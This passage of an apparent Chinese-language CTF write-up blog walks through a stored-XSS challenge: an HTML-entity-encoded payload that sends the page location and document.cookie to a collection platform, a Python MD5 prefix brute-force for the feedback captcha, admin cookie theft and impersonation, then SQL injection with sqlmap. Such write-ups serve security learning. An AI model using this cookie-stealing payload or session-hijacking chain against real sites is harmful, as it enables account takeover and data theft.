+escape((function(){try{return document.location.href}catch(e){return''}})())+
'&amp;toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())
+'&amp;cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())
+'&amp;opener='+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:''}
catch(e){return''}})());})();&quot;
for i in payload:
    payload_end += &quot;&amp;#&quot; + str(ord(i))
payload_final = &quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + payload_end + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;
print payload_final
</code></pre>
<p>同样是便于阅读，再此强调一下哈，中间千万别要换行符，因为换行符会占一个ascii码的......<br>
脚本运行效果如下：<br>
<img src="https://zhangzy999.github.io//post-images/1588081474858.png" alt="" loading="lazy"><br>
再次提醒：前文中我省事儿用的是别的大佬的payload，这个做法可以，但是不要忘记改id哦~<br>
当然......你在你的项目里复制代码最好不过了<br>
然后我们提交这段恶意代码，显示提交成功，这个时候我们的任务已经完成一半了，接下来要做的是反馈页面，然后让管理员访问我们的提交页面从而偷取它的cookie     <s>馋了，想吃曲奇饼干了</s><br>
好，我们进入反馈页面<br>
<img src="https://zhangzy999.github.io//post-images/1588081872289.png" alt="" loading="lazy"><br>
它还需要验证码，给大家附上一个链接，讲的是hash碰撞与生日攻击，蛮有意思的，虽然我没看完（逃）<br>
<a href="https://blog.csdn.net/zl1zl2zl3/article/details/83476069">哈希碰撞与生日攻击学习参考链接</a><br>
好，由于是前六位，我们需要的工作量并不是特别大，最起码我们知道了循环的范围是从6位数开始，额，先到1k我循环试试吧，不过经过我的多次实验发现1kw足够了，下面是碰撞md5的python脚本（python大法好）</p>
<pre><code class="language-python">import hashlib
for x in range(100000,10000000):
    md5_hack = hashlib.md5(str(x)).hexdigest()
    if md5_hack[0:6] == &quot;1d5327&quot; :
        print x
</code></pre>
<p>上述代码中的&quot;1d5327&quot;就是我们反馈的时候提示我们的验证码，我们通过碰撞的方式来得到原来的验证码<br>
经过十几秒最终跑出来了<br>
<img src="https://zhangzy999.github.io//post-images/1588082715077.png" alt="" loading="lazy"><br>
我们输入碰撞得来的密码，提示我们反馈成功<br>
<img src="https://zhangzy999.github.io//post-images/1588082798662.png" alt="" loading="lazy"><br>
OK，我们去平台那里坐等管理员的cookie<br>
<img src="https://zhangzy999.github.io//post-images/1588082880953.png" alt="" loading="lazy"><br>
OK，拿到cookie了，然后开始扫描康康管理员的后台登录界面<br>
很简单，就是admin.php<br>
我们进去之后<br>
发现如下图：<br>
<img src="https://zhangzy999.github.io//post-images/1588082964511.png" alt="" loading="lazy"><br>
提示我们不是管理员，没毛病吧，然后我们通过小插件来输入管理员的cookie，伪造管理员的身份进去就好啦<br>
<img src="https://zhangzy999.github.io//post-images/1588083070484.png" alt="" loading="lazy"><br>
好，我们已经成功进入后台，出现了一个查询框框<br>
<img src="https://zhangzy999.github.io//post-images/1588083098026.png" alt="" loading="lazy"><br>
嗯......sql注入没跑了<br>
这个sql注入是最低级的sql注入了，没有防火墙，sqlmap一把梭即可，或者手工注入也很简单鸭<br>
我直接附上注入的最后结果<br>
<img src="https://zhangzy999.github.io//post-images/1588083277788.png" alt="" loading="lazy"><br>
如果大家对sql注入的赛题感兴趣，请在哔哩哔哩上搜索up主：yuyu-宇<br>
这个是我的主页，我做了很多包括教学视频和刷题视频，都是sql注入方面的<br>
如果文章内容哪里不对，还请哔哩哔哩私信联系我，蟹蟹大家！！</p>
]]></content>
    </entry>
</feed>